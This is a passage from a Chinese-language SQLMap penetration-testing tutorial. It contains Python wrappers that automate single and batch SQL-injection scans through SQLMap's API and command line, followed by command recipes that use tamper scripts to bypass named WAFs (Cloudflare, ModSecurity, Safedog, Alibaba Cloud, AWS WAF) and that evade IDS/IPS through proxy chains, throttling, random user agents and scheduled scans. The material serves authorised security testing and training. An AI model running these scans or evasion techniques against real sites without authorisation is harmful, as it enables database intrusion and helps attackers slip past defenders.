            'url': target_url,
            'batch': True,
            'randomAgent': True
        }
        response = requests.post(url, json=data)
        return response.json()
    
    def get_status(self):
        """获取扫描状态"""
        url = f"{self.base_url}/scan/{self.task_id}/status"
        response = requests.get(url)
        return response.json()['status']
    
    def get_data(self):
        """获取扫描结果"""
        url = f"{self.base_url}/scan/{self.task_id}/data"
        response = requests.get(url)
        return response.json()
    
    def delete_task(self):
        """删除任务"""
        url = f"{self.base_url}/task/{self.task_id}/delete"
        response = requests.get(url)
        return response.json()

# 使用示例
if __name__ == '__main__':
    # 启动SQLMap API服务器
    # sqlmap --api -s
    
    api = SQLMapAPI()
    
    # 创建任务
    api.create_task()
    
    # 开始扫描
    target = "http://example.com/page.php?id=1"
    api.start_scan(target)
    
    # 轮询状态
    while True:
        status = api.get_status()
        print(f"扫描状态: {status}")
        
        if status == 'terminated':
            break
        
        time.sleep(5)
    
    # 获取结果
    data = api.get_data()
    print(json.dumps(data, indent=2))
    
    # 删除任务
    api.delete_task()
```

#### 二次开发集成
```python
#!/usr/bin/env python
# sqlmap_integration.py - SQLMap集成到自定义工具

import subprocess
import json
import os

class SQLMapWrapper:
    """SQLMap包装类"""
    
    def __init__(self, sqlmap_path='sqlmap'):
        self.sqlmap_path = sqlmap_path
    
    def scan(self, url, **options):
        """
        执行SQL扫描
        
        参数:
            url: 目标URL
            **options: SQLMap选项
        
        返回:
            扫描结果字典
        """
        cmd = [self.sqlmap_path, '-u', url, '--batch']
        
        # 添加选项
        for key, value in options.items():
            if value is True:
                cmd.append(f'--{key}')
            elif value is not False:
                cmd.append(f'--{key}={value}')
        
        # 执行命令
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr
            }
        
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': '',
                'error': '扫描超时'
            }
    
    def batch_scan(self, urls, **options):
        """批量扫描"""
        results = []
        
        for url in urls:
            print(f"正在扫描: {url}")
            result = self.scan(url, **options)
            results.append({
                'url': url,
                'result': result
            })
        
        return results

# 使用示例
if __name__ == '__main__':
    wrapper = SQLMapWrapper()
    
    # 单个扫描
    result = wrapper.scan(
        'http://example.com/page.php?id=1',
        dbs=True,
        random_agent=True
    )
    print(result['output'])
    
    # 批量扫描
    urls = [
        'http://example1.com/page.php?id=1',
        'http://example2.com/product.php?pid=2'
    ]
    results = wrapper.batch_scan(urls, batch=True, random_agent=True)
    
    for item in results:
        print(f"\n{'='*50}")
        print(f"URL: {item['url']}")
        print(f"结果: {item['result']['success']}")
```

### 11.2 防护与对抗

#### WAF识别与绕过

##### WAF指纹识别
```bash
# 识别WAF类型
sqlmap -u "url" --identify-waf

# 常见WAF特征
# Cloudflare: HTTP头包含 "CF-RAY"
# 阿里云盾: HTTP头包含 "Ali-CDN-Real-IP"
# 安全狗: 返回内容包含 "safedog"
# ModSecurity: 响应码 406, 501
```

##### 针对性绕过方案
```bash
# 1. Cloudflare绕过
sqlmap -u "url" \
  --tamper=space2comment \
  --random-agent \
  --delay=2 \
  --technique=T

# 2. ModSecurity绕过
sqlmap -u "url" \
  --tamper=modsecurityversioned,space2hash \
  --random-agent

# 3. 安全狗绕过
sqlmap -u "url" \
  --tamper=space2morehash,between,randomcase \
  --random-agent \
  --hpp

# 4. 阿里云盾绕过
sqlmap -u "url" \
  --tamper=space2comment,between \
  --random-agent \
  --delay=3 \
  --safe-url="http://example.com/" \
  --safe-freq=2

# 5. AWS WAF绕过
sqlmap -u "url" \
  --tamper=space2comment,charencode \
  --random-agent \
  --delay=2

# 6. 自定义WAF规则绕过
# 分析WAF拦截规则
# 构造针对性Tamper脚本
# 使用多层编码混淆
```

#### IPS/IDS对抗
```bash
# 1. 降低扫描频率
--delay=5 --timeout=30

# 2. 使用代理链
--proxy-file=proxies.txt

# 3. 分散测试时间
# 使用cron定时执行，避免集中测试

# 4. 混淆流量特征
--random-agent \
--randomize=id \
--hpp

# 5. 使用加密通道
--force-ssl

# 6. 避免敏感关键字
--tamper=randomcase,space2comment

# 7. 完整对抗方案
sqlmap -u "url" \
  --proxy="http://proxy:8080" \
  --random-agent \
  --delay=5 \
  --tamper=space2comment,randomcase \
  --safe-url="http://example.com/" \
  --safe-freq=3 \
  --hpp \
  --technique=T
```

